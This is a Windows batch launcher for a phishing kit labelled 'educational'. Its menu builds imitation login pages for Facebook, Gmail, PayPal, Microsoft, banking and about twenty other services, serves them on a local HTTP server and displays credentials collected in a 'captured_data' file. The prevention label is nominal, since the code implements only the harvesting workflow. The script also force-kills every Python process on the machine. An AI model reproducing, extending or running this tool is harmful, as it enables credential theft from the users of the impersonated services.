@echo off
setlocal enabledelayedexpansion
title Educational Phishing Tool - ABID MEHMOOD (The White HAT Hacker)

REM Colors for CMD (using color command)
set "RED=[91m"
set "GREEN=[92m"
set "YELLOW=[93m"
set "BLUE=[94m"
set "PURPLE=[95m"
set "CYAN=[96m"
set "WHITE=[97m"
set "NC=[0m"

:banner
cls
echo.
echo %CYAN%╔══════════════════════════════════════════════════════════════════════════════╗%NC%
echo %CYAN%║                                                                              ║%NC%
echo %CYAN%║    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗                ║%NC%
echo %CYAN%║    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝                ║%NC%
echo %CYAN%║    ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗               ║%NC%
echo %CYAN%║    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║               ║%NC%
echo %CYAN%║    ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝               ║%NC%
echo %CYAN%║    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝                ║%NC%
echo %CYAN%║                                                                              ║%NC%
echo %CYAN%║                    ████████╗ ██████╗  ██████╗ ██╗                          ║%NC%
echo %CYAN%║                    ╚══██╔══╝██╔═══██╗██╔═══██╗██║                          ║%NC%
echo %CYAN%║                       ██║   ██║   ██║██║   ██║██║                          ║%NC%
echo %CYAN%║                       ██║   ██║   ██║██║   ██║██║                          ║%NC%
echo %CYAN%║                       ██║   ╚██████╔╝╚██████╔╝███████╗                     ║%NC%
echo %CYAN%║                       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝                     ║%NC%
echo %CYAN%║                                                                              ║%NC%
echo %CYAN%║                     Created by: ABID MEHMOOD                                 ║%NC%
echo %CYAN%║                    (The White HAT Hacker)                                   ║%NC%
echo %CYAN%║                                                                              ║%NC%
echo %CYAN%║                   Educational Cybersecurity Tool                            ║%NC%
echo %CYAN%║                  For Learning Phishing Prevention                           ║%NC%
echo %CYAN%╚══════════════════════════════════════════════════════════════════════════════╝%NC%
echo.

:check_dependencies
echo %YELLOW%[*] Checking dependencies...%NC%

REM Check Python
python --version >nul 2>&1
if %errorlevel% equ 0 (
    echo %GREEN%[+] Python found%NC%
    for /f "tokens=*" %%i in ('python --version') do set PYTHON_VERSION=%%i
    echo %GREEN%[+] Version: !PYTHON_VERSION!%NC%
) else (
    echo %RED%[!] Python not found. Please install Python from python.org%NC%
    echo %YELLOW%[*] Download: https://www.python.org/downloads/%NC%
    pause
    exit /b 1
)

:setup_directories
echo %YELLOW%[*] Setting up directory structure...%NC%

if not exist "templates" mkdir "templates"
if not exist "logs" mkdir "logs"
if not exist "captured_data" mkdir "captured_data"
if not exist "assets" mkdir "assets"
if not exist "assets\css" mkdir "assets\css"
if not exist "assets\js" mkdir "assets\js"
if not exist "assets\images" mkdir "assets\images"

echo %GREEN%[+] Directory structure created%NC%

:main_menu
cls
call :banner
echo %WHITE%╔══════════════════════════════════════════════════════════════════════════════╗%NC%
echo %WHITE%║                              MAIN MENU                                      ║%NC%
echo %WHITE%╠══════════════════════════════════════════════════════════════════════════════╣%NC%
echo %WHITE%║                                                                              ║%NC%
echo %CYAN%║  [1]  Facebook Login Page                                                   ║%NC%
echo %CYAN%║  [2]  Instagram Login Page                                                  ║%NC%
echo %CYAN%║  [3]  Twitter/X Login Page                                                  ║%NC%
echo %CYAN%║  [4]  LinkedIn Login Page                                                   ║%NC%
echo %CYAN%║  [5]  Gmail Login Page                                                      ║%NC%
echo %CYAN%║  [6]  Yahoo Mail Login Page                                                 ║%NC%
echo %CYAN%║  [7]  Outlook Login Page                                                    ║%NC%
echo %CYAN%║  [8]  PayPal Login Page                                                     ║%NC%
echo %CYAN%║  [9]  Amazon Login Page                                                     ║%NC%
echo %CYAN%║  [10] eBay Login Page                                                       ║%NC%
echo %CYAN%║  [11] Netflix Login Page                                                    ║%NC%
echo %CYAN%║  [12] Spotify Login Page                                                    ║%NC%
echo %CYAN%║  [13] Apple ID Login Page                                                   ║%NC%
echo %CYAN%║  [14] Microsoft Login Page                                                  ║%NC%
echo %CYAN%║  [15] GitHub Login Page                                                     ║%NC%
echo %CYAN%║  [16] Discord Login Page                                                    ║%NC%
echo %CYAN%║  [17] WhatsApp Web Login                                                    ║%NC%
echo %CYAN%║  [18] Telegram Web Login                                                    ║%NC%
echo %CYAN%║  [19] Steam Login Page                                                      ║%NC%
echo %CYAN%║  [20] Dropbox Login Page                                                    ║%NC%
echo %CYAN%║  [21] Adobe Login Page                                                      ║%NC%
echo %CYAN%║  [22] Banking Login (Generic)                                               ║%NC%
echo %CYAN%║  [23] WordPress Login                                                       ║%NC%
echo %CYAN%║  [24] Custom Template Creator                                               ║%NC%
echo %WHITE%║                                                                              ║%NC%
echo %YELLOW%║  [25] View Captured Data                                                    ║%NC%
echo %YELLOW%║  [26] Start Web Server                                                      ║%NC%
echo %YELLOW%║  [27] Stop Web Server                                                       ║%NC%
echo %YELLOW%║  [28] View Server Logs                                                      ║%NC%
echo %RED%║  [99] Exit                                                                   ║%NC%
echo %WHITE%║                                                                              ║%NC%
echo %WHITE%╚══════════════════════════════════════════════════════════════════════════════╝%NC%
echo.

set /p choice="Select an option: "

if "%choice%"=="1" call :create_template facebook
if "%choice%"=="2" call :create_template instagram
if "%choice%"=="3" call :create_template twitter
if "%choice%"=="4" call :create_template linkedin
if "%choice%"=="5" call :create_template gmail
if "%choice%"=="6" call :create_template yahoo
if "%choice%"=="7" call :create_template outlook
if "%choice%"=="8" call :create_template paypal
if "%choice%"=="9" call :create_template amazon
if "%choice%"=="10" call :create_template ebay
if "%choice%"=="11" call :create_template netflix
if "%choice%"=="12" call :create_template spotify
if "%choice%"=="13" call :create_template apple
if "%choice%"=="14" call :create_template microsoft
if "%choice%"=="15" call :create_template github
if "%choice%"=="16" call :create_template discord
if "%choice%"=="17" call :create_template whatsapp
if "%choice%"=="18" call :create_template telegram
if "%choice%"=="19" call :create_template steam
if "%choice%"=="20" call :create_template dropbox
if "%choice%"=="21" call :create_template adobe
if "%choice%"=="22" call :create_template banking
if "%choice%"=="23" call :create_template wordpress
if "%choice%"=="24" call :create_custom_template
if "%choice%"=="25" call :view_captured_data
if "%choice%"=="26" call :start_server
if "%choice%"=="27" call :stop_server
if "%choice%"=="28" call :view_logs
if "%choice%"=="99" goto :exit_program

echo %RED%[!] Invalid option. Please try again.%NC%
timeout /t 2 >nul
goto :main_menu

:create_template
echo %YELLOW%[*] Creating %1 template...%NC%
python web_server.py --create-template %1
echo %GREEN%[+] %1 template created%NC%
echo %CYAN%[*] Access at: http://localhost:8080/%1.html%NC%
timeout /t 3 >nul
goto :main_menu

:create_custom_template
set /p template_name="Enter custom template name: "
echo %YELLOW%[*] Creating %template_name% template...%NC%
python web_server.py --create-template %template_name%
echo %GREEN%[+] %template_name% template created%NC%
timeout /t 3 >nul
goto :main_menu

:start_server
echo %YELLOW%[*] Starting web server...%NC%

REM Kill existing Python servers
taskkill /f /im python.exe >nul 2>&1

REM Start Python HTTP server
cd templates
start /b python -m http.server 8080 > ..\logs\server.log 2>&1
cd ..

timeout /t 3 >nul

echo %GREEN%[+] Web server started on http://localhost:8080%NC%
echo %CYAN%[*] Access templates at: http://localhost:8080/index.html%NC%

REM Try to open browser
start http://localhost:8080 >nul 2>&1

timeout /t 2 >nul
goto :main_menu

:stop_server
echo %YELLOW%[*] Stopping web server...%NC%
taskkill /f /im python.exe >nul 2>&1
if exist "logs\server.pid" del "logs\server.pid"
echo %GREEN%[+] Web server stopped%NC%
timeout /t 2 >nul
goto :main_menu

:view_captured_data
echo %YELLOW%[*] Captured Data:%NC%
echo ════════════════════════════════════════════════════════════════════════════════
if exist "captured_data\credentials.txt" (
    type "captured_data\credentials.txt"
) else (
    echo %RED%[!] No captured data found%NC%
)
echo ════════════════════════════════════════════════════════════════════════════════
echo %CYAN%Press any key to continue...%NC%
pause >nul
goto :main_menu

:view_logs
echo %YELLOW%[*] Server Logs:%NC%
echo ════════════════════════════════════════════════════════════════════════════════
if exist "logs\server.log" (
    REM Show last 20 lines
    powershell -command "Get-Content 'logs\server.log' -Tail 20"
) else (
    echo %RED%[!] No server logs found%NC%
)
echo ════════════════════════════════════════════════════════════════════════════════
echo %CYAN%Press any key to continue...%NC%
pause >nul
goto :main_menu

:exit_program
echo %GREEN%[*] Exiting... Stay safe!%NC%
call :stop_server
exit /b 0